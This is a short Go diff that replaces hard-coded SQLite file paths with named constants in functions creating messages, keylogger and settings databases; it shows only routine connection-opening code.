@@ -9,7 +9,7 @@ import (
 // Messsages Database
 func createMessagesDatabase() error {
 	// Open a connection to the database
-	db, err := sql.Open("sqlite3", "DB/messages.db")
+	db, err := sql.Open("sqlite3", MessagesDB)
 	if err != nil {
 		return err
 	}
@@ -45,7 +45,7 @@ func createMessagesDatabase() error {
 // Create Keylogger Database and Table if it doesn't exist
 func createKeyloggerDatabase() error {
 	// Open a connection to the database
-	db, err := sql.Open("sqlite3", "DB/keylogger.db")
+	db, err := sql.Open("sqlite3", KeyboardDB)
 	if err != nil {
 		return err
 	}
@@ -112,7 +112,7 @@ func createLocalMediaDatabase() error {
 // Create Settings Database and Table if it doesn't exist
 func createSettingsDatabase() error {
 	// Open a connection to the database
-	db, err := sql.Open("sqlite3", "DB/settings.db")
+	db, err := sql.Open("sqlite3", SettingsDB)
 	if err != nil {
 		return err
 	}
